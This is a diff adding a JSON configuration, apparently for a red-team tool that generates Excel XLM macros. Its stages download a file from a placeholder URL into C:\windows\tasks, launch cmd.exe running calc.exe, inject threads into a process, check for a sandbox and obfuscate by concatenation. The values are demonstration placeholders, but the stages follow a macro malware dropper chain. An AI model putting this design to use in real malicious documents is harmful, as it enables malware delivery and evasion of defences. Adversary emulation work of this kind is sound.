@@ -1,0 +1,53 @@
+{
+	"name":"OLDFASIONED",
+	"version":"0.1",
+	"author":"david",
+	"description":"XLM macro to download files and/or execute commands",
+	"TTP":[""],
+	"stages": [
+		{
+			"action":"xlm_download",
+            "action_prereqs":"",
+            "_action_comments":"This only works on 32-bit installations of Excel",
+			"action_params": {
+				"download_method":"URLDownloadToFile",
+				"URL":"http://example.com",
+				"path":"C:\\windows\\tasks\\test.txt"
+			}
+		},
+		{
+			"action":"xlm_execute",
+			"action_prereqs":"",
+			"_action_comments":"This stage spawns a new process with arguments. Works on x64 and x86",
+			"action_params": {
+				"exec_method":"ShellExecute",
+				"_exec_method_comment":"EXEC (builtin to XLM), ShellExecute (from shell32.dll)",
+				"cmd":"C:\\windows\\system32\\cmd.exe",
+				"args":"/c calc.exe"
+			}
+		},
+		{
+			"action":"xlm_inject",
+			"action_prereqs":"",
+			"_action_comments":"This stage injects threads into a process. Currently only works on x86, currently can only create local threads",
+			"action_params": {
+				"exec_method":"ShellExecute",
+				"_exec_method_comment":"EXEC (builtin to XLM), CreateProcess (from kernel32.dll), ShellExecute (from shell32.dll)"
+			}
+        },
+        {
+			"action":"xlm_sandboxcheck",
+			"action_prereqs":"",
+			"action_params": {
+				"checks":[""]
+			}
+        },
+        {
+			"action":"xlm_obfuscate",
+			"action_prereqs":"",
+			"action_params": {
+				"obfuscation":"concatenate"
+			}
+		}
+	]
+}
